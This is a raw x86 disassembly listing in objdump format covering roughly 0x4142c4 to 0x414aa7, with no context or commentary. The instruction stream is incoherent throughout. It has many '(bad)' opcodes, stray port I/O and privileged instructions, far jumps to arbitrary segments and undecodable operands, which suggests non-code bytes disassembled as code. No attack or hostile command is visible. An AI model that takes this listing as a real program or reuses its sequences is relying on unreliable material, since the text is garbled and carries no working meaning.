  4142c4:	xchg   DWORD PTR [edx+eax*1+0x72e211d6],esp
  4142cb:	xchg   esp,eax
  4142cc:	clc    
  4142cd:	sub    DWORD PTR [edx],ecx
  4142cf:	mov    esp,0x4cbc5b16
  4142d4:	mov    esp,fs
  4142d6:	mov    dh,0x62
  4142d8:	cmp    DWORD PTR [ebx+0x77],ebx
  4142db:	rcl    DWORD PTR [esi],cl
  4142dd:	pusha  
  4142de:	adc    DWORD PTR [edi-0x6505eaf2],ebx
  4142e4:	inc    ebx
  4142e5:	cmp    edx,eax
  4142e7:	xor    eax,0xefff4d89
  4142ec:	(bad)  
  4142ed:	sub    BYTE PTR [ecx-0x4],al
  4142f0:	lods   al,BYTE PTR ds:[esi]
  4142f1:	stc    
  4142f2:	cs in  eax,dx
  4142f4:	test   eax,0x224ed775
  4142f9:	cwde   
  4142fa:	mov    ds:0xbb765f5d,al
  4142ff:	pop    ecx
  414300:	ins    DWORD PTR es:[edi],dx
  414301:	icebp  
  414302:	adc    eax,0xb21550b7
  414307:	bound  ebp,QWORD PTR [esi-0x1]
  41430a:	int    0xd4
  41430c:	dec    eax
  41430d:	(bad)  
  41430e:	jmp    0x41437e
  414310:	and    edi,DWORD PTR [edx-0xd5eab32]
  414316:	mov    ch,0x7c
  414318:	cmp    BYTE PTR [edi+ebx*2-0x2f56d9e8],0x63
  414320:	ror    BYTE PTR ds:0xec3ab29f,1
  414326:	push   es
  414327:	jle    0x414341
  414329:	jle    0x414338
  41432b:	pop    es
  41432c:	add    bh,ah
  41432e:	cmc    
  41432f:	mov    esp,DWORD PTR [edi-0x3d0eb9c1]
  414335:	cmc    
  414336:	xchg   ecx,eax
  414337:	mov    dl,0x65
  414339:	mov    ds:0x4cfdbb86,eax
  41433e:	data16 sbb al,0x69
  414341:	fwait
  414342:	nop
  414343:	cmp    al,ch
  414345:	pop    ss
  414346:	push   ds
  414347:	sbb    ecx,DWORD PTR [ecx+0x71a8957f]
  41434d:	jbe    0x414395
  41434f:	xor    al,0x42
  414351:	inc    BYTE PTR [ecx+0x6216cd74]
  414357:	pop    ds
  414358:	aam    0x35
  41435a:	ins    DWORD PTR es:[edi],dx
  41435b:	mov    ?,WORD PTR [ecx-0x46]
  41435e:	jg     0x4142f2
  414360:	in     al,0x4f
  414362:	scas   eax,DWORD PTR es:[edi]
  414363:	retf   
  414364:	or     DWORD PTR [ebp+0x15],edi
  414367:	sub    DWORD PTR [edi+0x28c0004],ebx
  41436d:	xor    eax,0xb96d7f87
  414372:	and    al,0x74
  414374:	out    dx,al
  414375:	add    BYTE PTR [ebx+0x3b1a15b6],dl
  41437b:	arpl   WORD PTR [ebp+0x50],bx
  41437e:	adc    cl,BYTE PTR [edi+0x7d]
  414381:	je     0x41433b
  414383:	sub    al,0xd3
  414385:	adc    edi,DWORD PTR fs:[ebx]
  414388:	(bad)  
  414389:	push   esi
  41438a:	xchg   ecx,eax
  41438b:	xchg   esi,eax
  41438c:	(bad)
  41438f:	push   edx
  414390:	test   DWORD PTR [edx+0x7f5099d5],esp
  414396:	push   edi
  414397:	sbb    bh,BYTE PTR ds:0x8edd6912
  41439d:	dec    edx
  41439e:	xor    ebp,DWORD PTR [ecx-0x1a78afd2]
  4143a4:	pusha  
  4143a5:	push   0x2a
  4143a7:	push   ebp
  4143a8:	je     0x4143a1
  4143aa:	mov    esp,0x1e7f7591
  4143af:	(bad)  
  4143b0:	xlat   BYTE PTR ds:[ebx]
  4143b1:	mov    eax,0x850e465c
  4143b6:	test   BYTE PTR [ecx],bl
  4143b8:	pop    edx
  4143b9:	ss mov dh,0xbd
  4143bc:	pop    ss
  4143bd:	jecxz  0x414394
  4143bf:	push   edi
  4143c0:	fcmovbe st,st(7)
  4143c2:	lods   al,BYTE PTR ds:[esi]
  4143c3:	sub    DWORD PTR [esi-0x6de4508e],esp
  4143c9:	pop    ebp
  4143ca:	mov    esp,0xa56d76f3
  4143cf:	(bad)
  4143d2:	shl    DWORD PTR [ebx],cl
  4143d4:	push   esp
  4143d5:	fcomp  QWORD PTR [esi+edx*1+0x676d7e05]
  4143dc:	dec    ecx
  4143dd:	in     al,0x94
  4143df:	jl     0x4143a9
  4143e1:	outs   dx,DWORD PTR ds:[esi]
  4143e2:	sub    edi,DWORD PTR [edx+0x20ef1133]
  4143e8:	out    0x46,al
  4143ea:	std    
  4143eb:	(bad)  
  4143ec:	mov    bx,0x3ce8
  4143f0:	pop    esp
  4143f1:	fxch   st(3)
  4143f3:	jg     0x4143d5
  4143f5:	pop    ecx
  4143f6:	hlt    
  4143f7:	fdiv   st(4),st
  4143f9:	popf   
  4143fa:	cdq    
  4143fb:	adc    edi,DWORD PTR [edi+0x1b]
  4143fe:	xor    eax,0x272b016d
  414403:	and    ecx,esi
  414405:	jmp    0x414427
  414407:	test   al,0x6b
  414409:	addr16 (bad) 
  41440b:	cmp    bl,BYTE PTR [esi+edx*4+0x5e]
  41440f:	loop   0x41445d
  414411:	ror    ebx,1
  414413:	(bad)  
  414414:	xchg   ecx,eax
  414415:	jne    0x4143ed
  414417:	sub    BYTE PTR [eax],ch
  414419:	iret   
  41441a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41441b:	adc    edx,DWORD PTR [esi+0x23566535]
  414421:	mov    edi,0xeb53749c
  414426:	cmp    al,0xa7
  414428:	dec    edx
  414429:	mov    ch,0x52
  41442b:	xor    eax,0x6d37afcb
  414430:	sub    bl,al
  414432:	ret    0x2fd5
  414435:	jecxz  0x4143d3
  414437:	jnp    0x414405
  414439:	fiadd  DWORD PTR [esp+ebx*8+0xacc4e7b]
  414440:	fdiv   st(5),st
  414442:	dec    ebx
  414443:	push   ecx
  414444:	mov    al,BYTE PTR [edi+0x471c3ae4]
  41444a:	xlat   BYTE PTR ds:[ebx]
  41444b:	and    al,0x5f
  41444d:	mov    al,0x62
  41444f:	mov    al,0x30
  414451:	sub    ah,al
  414453:	xor    ebp,DWORD PTR ds:0x5809c6de
  414459:	jp     0x414448
  41445b:	push   eax
  41445c:	jecxz  0x414465
  41445e:	jmp    0x4144cc
  414460:	mov    ds:0xa2b310af,eax
  414465:	add    eax,0xce2710d3
  41446a:	push   0x7f
  41446c:	xchg   dh,al
  41446e:	in     eax,dx
  41446f:	add    eax,0xe7b95320
  414474:	scas   al,BYTE PTR es:[edi]
  414475:	gs data16 mov cl,0x5b
  414479:	fcmovne st,st(2)
  41447b:	jle    0x41440a
  41447d:	bound  esp,QWORD PTR [ecx]
  41447f:	mov    ds:0xa63289e5,al
  414484:	daa    
  414485:	(bad)  
  414487:	jg     0x4144a1
  414489:	ss call 0xa996:0x4adeadc
  414491:	sub    bh,ah
  414493:	call   0x55d96705
  414498:	jae    0x414426
  41449a:	mov    esp,0xb6724100
  41449f:	xchg   BYTE PTR [ebx+0x518adde7],bl
  4144a5:	pop    eax
  4144a6:	fstp   TBYTE PTR [edx]
  4144a8:	fwait
  4144a9:	gs jnp 0x41444e
  4144ac:	cli    
  4144ad:	pop    ss
  4144ae:	retf   0x1eca
  4144b1:	outs   dx,BYTE PTR ds:[esi]
  4144b2:	jns    0x41450e
  4144b4:	inc    edi
  4144b5:	fild   DWORD PTR [ebx]
  4144b7:	inc    esi
  4144b8:	pop    es
  4144b9:	xor    eax,ebp
  4144bb:	dec    esp
  4144bc:	in     eax,0x24
  4144be:	ror    ecx,0x4
  4144c1:	inc    edi
  4144c2:	ret    
  4144c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144c4:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4144c6:	test   eax,0xf0a5330
  4144cb:	xor    bl,ch
  4144cd:	addr16 push cs
  4144cf:	cmc    
  4144d0:	pop    es
  4144d1:	and    al,0x37
  4144d3:	jl     0x41445a
  4144d5:	test   al,0x3f
  4144d7:	arpl   WORD PTR [esi],di
  4144d9:	xchg   BYTE PTR [esi+0x75232fe3],ah
  4144df:	adc    BYTE PTR [edi+0x42],bh
  4144e2:	jo     0x41452e
  4144e4:	daa    
  4144e5:	gs pushf 
  4144e7:	fwait
  4144e8:	push   cs
  4144e9:	retf   0x2bbc
  4144ec:	imul   DWORD PTR [ecx-0x6f3332e9]
  4144f2:	xor    al,0xb0
  4144f4:	cmp    BYTE PTR [edi-0x22],ch
  4144f7:	sbb    bl,BYTE PTR [eax-0x23]
  4144fa:	xor    DWORD PTR [ebp-0x59],esp
  4144fd:	imul   edx,DWORD PTR [edx-0x3a],0x71f3c55e
  414504:	xchg   esi,eax
  414505:	stos   BYTE PTR es:[edi],al
  414506:	cmp    eax,0xaad40c59
  41450b:	cwde   
  41450c:	mov    edx,0x383d2237
  414511:	fsub   DWORD PTR ds:0x4c73e767
  414517:	push   esi
  414518:	cmp    esp,ebp
  41451a:	mov    ecx,0xa822937e
  41451f:	ret    
  414520:	xor    ah,bl
  414522:	in     eax,dx
  414523:	sbb    dl,BYTE PTR [edx]
  414525:	idiv   DWORD PTR [esi-0x6ae53136]
  41452b:	pop    es
  41452c:	fldenv [ecx]
  41452e:	aaa    
  41452f:	js     0x41452f
  414531:	dec    edi
  414532:	dec    ebx
  414533:	mov    bh,0xdd
  414535:	jae    0x4144ff
  414537:	sub    edi,DWORD PTR [ebx-0x7ed81ea6]
  41453d:	jl     0x414573
  41453f:	imul   ebx,DWORD PTR [edx-0x4d],0x8
  414543:	inc    esp
  414544:	mov    BYTE PTR ds:0x8048e0e5,bh
  41454a:	jb     0x414576
  41454c:	mov    bl,0xe9
  41454e:	mov    eax,0xb2220d2c
  414553:	push   ebp
  414554:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  414556:	sahf   
  414557:	inc    ebx
  414558:	mov    ch,0xdf
  41455a:	jae    0x414530
  41455c:	and    al,0xd4
  41455e:	call   0x82f4:0xf36155d5
  414565:	ror    eax,0xf2
  414568:	cmp    dl,dl
  41456a:	sub    BYTE PTR [esi+0x457254ed],0x1e
  414571:	ror    DWORD PTR [esi+0x2facdee5],1
  414577:	mov    eax,ds:0xd03ca181
  41457c:	(bad)  
  41457d:	in     eax,0xd1
  41457f:	xchg   esi,eax
  414580:	mov    DWORD PTR [ebp-0x60],ebp
  414583:	inc    ebx
  414584:	lock (bad) 
  414586:	mov    ah,0x32
  414588:	(bad)  
  41458a:	cmp    cl,ch
  41458c:	sti    
  41458d:	adc    al,0x8f
  41458f:	mov    bl,0xc1
  414591:	dec    eax
  414592:	retf   
  414593:	aam    0xf9
  414595:	and    eax,0x2de18199
  41459a:	dec    eax
  41459b:	ds dec esi
  41459d:	lods   eax,DWORD PTR ds:[esi]
  41459e:	outs   dx,BYTE PTR ds:[esi]
  41459f:	sub    BYTE PTR [ebx-0x6a],dl
  4145a2:	lods   al,BYTE PTR ds:[esi]
  4145a3:	sbb    eax,0xd5777431
  4145a8:	das    
  4145a9:	push   ebp
  4145aa:	sbb    ecx,ecx
  4145ac:	mov    edx,0x8018152e
  4145b1:	loop   0x414600
  4145b3:	mov    bl,0xc9
  4145b5:	pop    es
  4145b6:	in     al,dx
  4145b7:	sbb    DWORD PTR [ecx+0x1a],esi
  4145ba:	xor    eax,0xa962bb40
  4145bf:	loop   0x4145c8
  4145c1:	cs mov ecx,0xae191b56
  4145c7:	and    BYTE PTR [edx+0x438c3643],al
  4145cd:	xor    BYTE PTR [edx-0x74],al
  4145d0:	mov    dl,0x74
  4145d2:	lods   eax,DWORD PTR ds:[esi]
  4145d3:	and    DWORD PTR [edx-0x62],ecx
  4145d6:	push   0xffffffc2
  4145d8:	ret    
  4145d9:	push   es
  4145da:	scas   al,BYTE PTR es:[edi]
  4145db:	arpl   WORD PTR [ebp-0x9],bp
  4145de:	rcl    edi,cl
  4145e0:	sar    bl,cl
  4145e2:	mov    bl,0xc9
  4145e4:	fnstenv [ebx+0x55]
  4145e7:	xor    al,0xea
  4145e9:	out    0x17,al
  4145eb:	cmp    dl,bl
  4145ed:	pop    ds
  4145ee:	sti    
  4145ef:	mov    ebp,esp
  4145f1:	mov    BYTE PTR [ecx+eax*2],ah
  4145f4:	mov    ds:0xa74fb13f,al
  4145f9:	std    
  4145fa:	retf   0xd26e
  4145fd:	mov    ds:0xf1ed52cd,al
  414602:	push   es
  414603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414604:	fxch   st(0)
  414606:	mov    dl,0x48
  414608:	fisub  DWORD PTR [ebx-0x6d]
  41460b:	add    al,0xcd
  41460d:	stos   DWORD PTR es:[edi],eax
  41460e:	sti    
  41460f:	loope  0x41462f
  414611:	jmp    0x684d:0x6808d6aa
  414618:	mov    WORD PTR [edx-0x47],es
  41461b:	pop    ebp
  41461c:	(bad)  
  41461d:	sbb    esi,DWORD PTR [edi]
  41461f:	test   al,0xf0
  414621:	sub    DWORD PTR [eax-0x2e],ebp
  414624:	icebp  
  414625:	pop    ss
  414626:	xor    ch,BYTE PTR [ecx]
  414628:	popa   
  414629:	retf   
  41462a:	pop    es
  41462b:	jl     0x41467c
  41462d:	inc    esp
  41462e:	xchg   esp,eax
  41462f:	jecxz  0x4145e9
  414631:	push   edx
  414632:	cmp    bh,BYTE PTR [ebx+esi*1+0x1ea8d38e]
  414639:	sbb    ebp,esp
  41463b:	or     al,0xb5
  41463d:	icebp  
  41463e:	icebp  
  41463f:	test   BYTE PTR [ecx-0x3d],ch
  414642:	mov    edx,eax
  414644:	inc    esp
  414645:	repz ja 0x414607
  414648:	sahf   
  414649:	sbb    al,0xee
  41464b:	push   cs
  41464c:	adc    ecx,DWORD PTR [ebx+eiz*4-0x1800f03b]
  414653:	add    al,0x71
  414655:	popa   
  414656:	pop    es
  414657:	cwde   
  414658:	and    al,0xea
  41465a:	stos   BYTE PTR es:[edi],al
  41465b:	xor    DWORD PTR es:[edi-0x5b],esi
  41465f:	(bad)  
  414660:	in     al,dx
  414661:	lods   al,BYTE PTR ds:[esi]
  414662:	jmp    0x86790b50
  414667:	in     al,dx
  414668:	fdiv   st,st(3)
  41466a:	mov    cl,BYTE PTR [ebx-0x1b]
  41466d:	cmp    eax,0xa2568ea1
  414672:	ins    BYTE PTR es:[edi],dx
  414673:	or     ah,bl
  414675:	fild   QWORD PTR [eax+esi*2+0x2784e71b]
  41467c:	push   edi
  41467d:	push   eax
  41467e:	iret   
  41467f:	jmp    0x4146cb
  414681:	lahf   
  414682:	or     ch,BYTE PTR [ebx-0x33]
  414685:	ret    0xdc6a
  414688:	test   al,0x22
  41468a:	cmp    eax,0xe2dcadb6
  41468f:	xor    eax,0xb7deb948
  414694:	test   DWORD PTR [eax+0x36b3c554],ebp
  41469a:	push   cs
  41469b:	or     DWORD PTR [edx-0x48],0xae6450d
  4146a2:	mov    DWORD PTR [esi],ecx
  4146a4:	out    0x4b,al
  4146a6:	mov    BYTE PTR [ebx+0x1a],0x6f
  4146aa:	sub    al,0x92
  4146ac:	xor    eax,0x4060ea57
  4146b1:	rcr    DWORD PTR [ecx+0x44],1
  4146b4:	hlt    
  4146b5:	test   BYTE PTR [esi+0x4621f9],bh
  4146bb:	xor    al,0x7f
  4146bd:	cmc    
  4146be:	jne    0x41472d
  4146c0:	sub    ecx,DWORD PTR [edx+0x52]
  4146c3:	test   eax,0xf1411cbf
  4146c8:	scas   eax,DWORD PTR es:[edi]
  4146c9:	or     al,0x85
  4146cb:	sub    cl,BYTE PTR [esi-0x3b7c1034]
  4146d1:	pop    ss
  4146d2:	popf   
  4146d3:	retf   
  4146d4:	sbb    BYTE PTR [ebx],ah
  4146d6:	sub    eax,DWORD PTR [ebp+0xa3100a7]
  4146dc:	inc    eax
  4146dd:	leave  
  4146de:	mov    esi,esi
  4146e0:	jmp    0x8ed7:0x2311c0e4
  4146e7:	xchg   ebx,eax
  4146e8:	pop    esi
  4146e9:	mov    ch,0xa2
  4146eb:	shr    DWORD PTR [ecx-0x29a95650],cl
  4146f1:	out    0x47,eax
  4146f3:	sar    BYTE PTR ds:0x8cf7fa37,1
  4146f9:	push   eax
  4146fa:	mov    ah,0xf3
  4146fc:	push   es
  4146fd:	xchg   esp,eax
  4146fe:	shl    DWORD PTR [ebp-0x5e5c618e],cl
  414704:	ficom  WORD PTR [edi+0xe]
  414707:	add    eax,0xa1cc277f
  41470c:	repnz pop ebp
  41470e:	leave  
  41470f:	pushf  
  414710:	js     0x414752
  414712:	xor    edi,ecx
  414714:	sub    DWORD PTR ds:0x1145866f,esp
  41471a:	push   edx
  41471b:	jge    0x41475b
  41471d:	xchg   edi,eax
  41471e:	and    esp,0xe0912077
  414724:	dec    edi
  414725:	rol    DWORD PTR [ebp-0x6f],cl
  414728:	test   DWORD PTR [edi],0x8adda2
  41472e:	imul   eax,DWORD PTR [ebp+0x100584ba],0xff83e67e
  414738:	fxch   st(7)
  41473a:	and    eax,eax
  41473c:	and    eax,0x88e64437
  414741:	js     0x4147bd
  414743:	pop    edi
  414744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414745:	ffreep st(5)
  414747:	or     DWORD PTR [ecx-0x4],ebp
  41474a:	jbe    0x4146d9
  41474c:	sbb    ch,BYTE PTR [eax-0x4d3e496b]
  414752:	mov    ebp,0xa5d237f4
  414757:	sub    eax,0xde9d1a7
  41475c:	lds    esp,FWORD PTR [ecx-0x16]
  41475f:	sbb    BYTE PTR [ecx],0x72
  414762:	pop    ss
  414763:	pop    es
  414764:	int    0x28
  414766:	pop    ss
  414767:	pop    ss
  414768:	imul   ecx,DWORD PTR [esi],0xffffffcc
  41476b:	imul   eax,eax,0xba6191ee
  414771:	fmul   QWORD PTR [eax+0x3c]
  414774:	or     esp,eax
  414776:	mov    edi,0x5db81fd6
  41477b:	fstp   DWORD PTR [edi+0x469df32d]
  414781:	sbb    BYTE PTR ds:0xf5855b0e,cl
  414787:	frstor [ebp+0x74]
  41478a:	aaa    
  41478b:	and    esi,DWORD PTR [ebp-0x28137430]
  414791:	(bad)  
  414792:	cli    
  414793:	hlt    
  414794:	mov    ecx,0x7f9ff1b2
  414799:	ins    BYTE PTR es:[edi],dx
  41479a:	pop    ds
  41479b:	shl    DWORD PTR [ebx],0x86
  41479e:	pop    edx
  41479f:	adc    al,0x5c
  4147a1:	ss pop es
  4147a3:	cld    
  4147a4:	sahf   
  4147a5:	jmp    0x6a203d8c
  4147aa:	aam    0x78
  4147ac:	pop    edi
  4147ad:	shl    BYTE PTR [ecx],0x75
  4147b0:	cdq    
  4147b1:	fwait
  4147b2:	push   ecx
  4147b3:	xchg   edx,eax
  4147b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147b5:	dec    edx
  4147b6:	sti    
  4147b7:	cvtps2pd xmm2,QWORD PTR [esi-0x7f447571]
  4147be:	in     al,dx
  4147bf:	int3   
  4147c0:	popf   
  4147c1:	mov    ecx,?
  4147c3:	jp     0x414819
  4147c5:	mov    bh,0x9a
  4147c7:	out    0x44,eax
  4147c9:	or     eax,0x71a3be75
  4147ce:	mov    al,ds:0xd309ea2a
  4147d3:	xchg   ebx,eax
  4147d4:	inc    ebx
  4147d5:	adc    DWORD PTR ds:0x11d530fb,0x6b2dd1c6
  4147df:	xor    bl,BYTE PTR [ebx-0x2b]
  4147e2:	lods   al,BYTE PTR ds:[esi]
  4147e3:	repz shl BYTE PTR [edx-0x23b7f987],1
  4147ea:	lahf   
  4147eb:	jnp    0x4147ae
  4147ed:	jnp    0x4147b8
  4147ef:	cmp    esp,DWORD PTR [edi-0x3de172d8]
  4147f5:	adc    DWORD PTR [ebx+0x6f],edi
  4147f8:	ficomp DWORD PTR [esi]
  4147fa:	push   esp
  4147fb:	cld    
  4147fc:	test   eax,0x4871788f
  414801:	pop    eax
  414802:	out    0x60,al
  414804:	mov    esp,0xe7841b26
  414809:	jg     0x414878
  41480b:	lahf   
  41480c:	jmp    0x8775:0xa8824bb3
  414813:	(bad)  
  414814:	loope  0x4147b7
  414816:	shl    DWORD PTR [ecx],cl
  414818:	rcr    cl,0x92
  41481b:	and    eax,0x855a830b
  414820:	imul   esi,DWORD PTR [esi],0x9d3163e5
  414826:	mov    ebx,0xbe8a8d31
  41482b:	sub    dh,BYTE PTR [eax-0x4c]
  41482e:	jle    0x4147f4
  414830:	mov    ds:0x1869f2cb,eax
  414835:	shr    DWORD PTR [ecx-0x56],cl
  414838:	pop    ebp
  414839:	push   edi
  41483a:	outs   dx,DWORD PTR ds:[esi]
  41483b:	sbb    DWORD PTR [ecx+0x6c],ebp
  41483e:	iret   
  41483f:	dec    ebp
  414840:	test   BYTE PTR [ebp+0xeeb9ff3],ch
  414846:	xor    BYTE PTR [eax-0x3e],bh
  414849:	add    ecx,esp
  41484b:	mov    bh,0xd5
  41484d:	or     bh,0xf9
  414850:	pop    es
  414851:	retf   0x6611
  414854:	add    al,0x5e
  414856:	ret    0x9e29
  414859:	enter  0x45b1,0xc9
  41485d:	jmp    0x2fe27bf
  414862:	cmp    DWORD PTR [ebp+0x14],0x1ec16c7e
  414869:	sbb    al,0x5e
  41486b:	popa   
  41486c:	cmp    al,0x11
  41486e:	mov    esi,0x3d9ff684
  414873:	xchg   edx,eax
  414874:	mov    DWORD PTR es:[eax*4+0x73f943b6],ebp
  41487c:	add    al,0xc6
  41487e:	and    al,0x52
  414880:	sub    ah,BYTE PTR [ebx]
  414882:	pop    ebx
  414883:	js     0x414856
  414885:	ret    
  414886:	xchg   edx,eax
  414887:	inc    ebp
  414888:	adc    ebp,DWORD PTR [ecx-0x4206c08]
  41488e:	and    al,0x1e
  414890:	imul   eax,DWORD PTR [eax+0x30],0xa04017c3
  414897:	(bad)  
  414898:	cs daa 
  41489a:	lods   eax,DWORD PTR ds:[esi]
  41489b:	clc    
  41489c:	and    eax,0x108e44ef
  4148a1:	int    0x87
  4148a3:	pop    es
  4148a4:	pusha  
  4148a5:	xchg   edi,eax
  4148a6:	xchg   ecx,eax
  4148a7:	lea    eax,[ecx+0x61]
  4148aa:	int3   
  4148ab:	repz popa 
  4148ad:	lods   eax,DWORD PTR ds:[esi]
  4148ae:	sbb    al,0x75
  4148b0:	lods   al,BYTE PTR es:[esi]
  4148b2:	jmp    0xcbe5:0x509c48f9
  4148b9:	pusha  
  4148ba:	push   ecx
  4148bb:	add    al,0x33
  4148bd:	fstp   st(1)
  4148bf:	pop    eax
  4148c0:	out    0x75,eax
  4148c2:	inc    edx
  4148c3:	retf   
  4148c4:	popf   
  4148c5:	push   ds
  4148c6:	adc    DWORD PTR [eax+0x7b58ee20],esi
  4148cc:	jl     0x414861
  4148ce:	cwde   
  4148cf:	test   eax,0xfdbf4ca4
  4148d4:	test   esi,0xc9284f98
  4148da:	or     al,0x11
  4148dc:	(bad)  
  4148dd:	push   ss
  4148de:	shl    ah,cl
  4148e0:	test   al,0xad
  4148e2:	ret    0xff33
  4148e5:	fsub   st(0),st
  4148e7:	retf   0x3e09
  4148ea:	(bad)  
  4148eb:	gs je  0x414936
  4148ee:	pop    ss
  4148ef:	inc    ecx
  4148f0:	dec    ebx
  4148f1:	ds jge 0x4148ed
  4148f4:	je     0x414970
  4148f6:	ss xor ebp,esp
  4148f9:	hlt    
  4148fa:	fstp   st(2)
  4148fc:	push   ebp
  4148fd:	(bad)  [edx+0x4b]
  414900:	outs   dx,DWORD PTR ds:[esi]
  414901:	scas   al,BYTE PTR es:[edi]
  414902:	test   BYTE PTR [esi+0x79807926],al
  414908:	add    eax,0xd7a7912e
  41490d:	retf   0xb82
  414910:	popa   
  414911:	add    dl,BYTE PTR [edx]
  414913:	hlt    
  414914:	sbb    dl,ch
  414916:	push   es
  414917:	shl    DWORD PTR [eax+0x43],cl
  41491a:	push   ds
  41491b:	lahf   
  41491c:	arpl   WORD PTR [edx],dx
  41491e:	test   BYTE PTR [edx],dh
  414920:	stc    
  414921:	into   
  414922:	scas   eax,DWORD PTR es:[edi]
  414923:	add    al,0xbb
  414925:	ja     0x414909
  414927:	mov    edi,0x316db19d
  41492c:	mov    dl,0xd0
  41492e:	mov    ecx,0x962328ac
  414933:	cmc    
  414934:	inc    ebx
  414935:	lods   eax,DWORD PTR ds:[esi]
  414936:	mov    ds:0x29fc8d35,eax
  41493b:	lds    esi,FWORD PTR [edi+0x4f744d29]
  414941:	loop   0x414971
  414943:	cwde   
  414944:	out    dx,al
  414945:	stc    
  414946:	cmc    
  414947:	mov    esp,0x9af434d8
  41494c:	scas   eax,DWORD PTR es:[edi]
  41494d:	and    al,0x64
  41494f:	stc    
  414950:	and    al,0x65
  414952:	in     eax,0x15
  414954:	mov    gs,ebp
  414956:	aam    0x7
  414958:	cli    
  414959:	adc    esp,DWORD PTR [ecx]
  41495b:	shl    BYTE PTR [esi],1
  41495d:	jae    0x414958
  41495f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414960:	(bad)  
  414961:	int    0xb3
  414963:	inc    ebp
  414964:	inc    ebp
  414965:	add    DWORD PTR [esi+0x10beb9b1],esp
  41496b:	iret   
  41496c:	mov    ah,0x7b
  41496e:	jbe    0x4148ff
  414970:	sbb    BYTE PTR [ecx-0x69],0xac
  414974:	sbb    BYTE PTR [esi-0x5ed8a0a3],0x2
  41497b:	data16 icebp 
  41497d:	mov    ah,0xe0
  41497f:	test   BYTE PTR ds:0xc4a5a4f8,0x4e
  414986:	xchg   bh,dl
  414988:	sbb    BYTE PTR [esi-0x6a147405],ch
  41498e:	sub    eax,0x3c16dc1f
  414993:	mov    al,0x9c
  414995:	test   BYTE PTR [ebx+edi*4+0x2b],ah
  414999:	push   eax
  41499a:	pusha  
  41499b:	mov    ds:0x1409a25d,al
  4149a0:	lods   al,BYTE PTR ds:[esi]
  4149a1:	pop    ecx
  4149a2:	std    
  4149a3:	push   ss
  4149a4:	fnstsw WORD PTR [esi-0x1e7b0266]
  4149aa:	js     0x414987
  4149ac:	mov    ah,0x70
  4149ae:	imul   edx,DWORD PTR [ebx+0x1a],0x35
  4149b2:	sub    DWORD PTR [edi+0x4f],edi
  4149b5:	shl    DWORD PTR [esi+0x43],0x79
  4149b9:	outs   dx,DWORD PTR ds:[esi]
  4149ba:	push   ecx
  4149bb:	sub    ecx,DWORD PTR [edi+ecx*1-0x595e9e6c]
  4149c2:	imul   ecx,DWORD PTR [esi+0x7a],0xf0b3fe3a
  4149c9:	sub    al,0xd8
  4149cb:	xlat   BYTE PTR es:[ebx]
  4149cd:	mov    ds:0x6a997b81,eax
  4149d2:	int3   
  4149d3:	lahf   
  4149d4:	ret    
  4149d5:	pop    ss
  4149d6:	push   ds
  4149d7:	sbb    al,0x6c
  4149d9:	mov    ah,0xf8
  4149db:	inc    ecx
  4149dc:	pop    ebp
  4149dd:	jbe    0x414a0c
  4149df:	aas    
  4149e0:	fisub  WORD PTR [esi+esi*1+0x6708198]
  4149e7:	(bad)  
  4149e8:	es jne 0x4149c8
  4149eb:	out    dx,al
  4149ec:	push   ss
  4149ed:	cwde   
  4149ee:	sbb    DWORD PTR [esi],ebp
  4149f0:	inc    esi
  4149f1:	ins    BYTE PTR es:[edi],dx
  4149f2:	dec    eax
  4149f3:	lods   eax,DWORD PTR ds:[esi]
  4149f4:	sub    al,0xf4
  4149f6:	push   eax
  4149f7:	sub    esp,DWORD PTR [ecx+0x41]
  4149fa:	push   es
  4149fb:	in     al,dx
  4149fc:	inc    esi
  4149fd:	inc    ecx
  4149fe:	pop    esi
  4149ff:	sbb    eax,0xf633a4cf
  414a04:	or     DWORD PTR [eax],eax
  414a06:	inc    eax
  414a07:	rcl    DWORD PTR [ecx-0x57],1
  414a0a:	push   0x13
  414a0c:	rcr    esi,0x49
  414a0f:	jmp    0xbde5c673
  414a14:	popa   
  414a15:	jns    0xa8db4a3a
  414a1b:	dec    ebp
  414a1c:	ss jo  0x4149a8
  414a1f:	push   ds
  414a20:	jle    0x414a73
  414a22:	sbb    al,0x27
  414a24:	dec    eax
  414a25:	dec    edi
  414a26:	jecxz  0x4149ae
  414a28:	lahf   
  414a29:	adc    DWORD PTR [eax+0x4329c859],ebx
  414a2f:	add    eax,0xf05df8b2
  414a34:	sti    
  414a35:	not    DWORD PTR [esi-0xd]
  414a38:	inc    esi
  414a39:	adc    esp,esp
  414a3b:	add    eax,0xd8202fe3
  414a40:	es mov bh,0x79
  414a43:	(bad)  
  414a44:	loop   0x414a9d
  414a46:	and    DWORD PTR [ebp-0x79c32d89],0xd03895ab
  414a50:	idiv   ch
  414a52:	sahf   
  414a53:	adc    DWORD PTR [eax+0x617b3e6d],0x52f7a2b5
  414a5d:	stos   BYTE PTR es:[edi],al
  414a5e:	pop    esi
  414a5f:	int3   
  414a60:	loop   0x414a60
  414a62:	adc    BYTE PTR [ebx+0xb],ah
  414a65:	push   cs
  414a66:	pop    ebx
  414a67:	inc    ebx
  414a68:	std    
  414a69:	sub    eax,0xcc985306
  414a6e:	pop    edi
  414a6f:	(bad)  
  414a71:	inc    edx
  414a72:	(bad)  
  414a73:	scas   eax,DWORD PTR es:[edi]
  414a74:	fisub  DWORD PTR [ecx+ecx*2+0x40]
  414a78:	(bad)  
  414a79:	sar    BYTE PTR [ebx+edi*4+0x1a],1
  414a7d:	jl     0x414ac1
  414a7f:	jecxz  0x414a90
  414a81:	xchg   ebp,eax
  414a82:	dec    BYTE PTR [eax]
  414a84:	pusha  
  414a85:	mov    bh,0xe8
  414a87:	retf   0x1612
  414a8a:	push   0xffffff92
  414a8c:	inc    edi
  414a8d:	and    edx,DWORD PTR es:[edi+eax*4-0x22]
  414a92:	xchg   edi,eax
  414a93:	pop    esi
  414a94:	inc    eax
  414a95:	loopne 0x414af8
  414a97:	ja     0x414adb
  414a99:	jle    0x414a34
  414a9b:	sbb    eax,0x2a05929e
  414aa0:	jmp    0x6f43613
  414aa5:	test   DWORD PTR [eax],ecx
  414aa7:	sub    BYTE PTR [ebp-0x3dfd758],ah
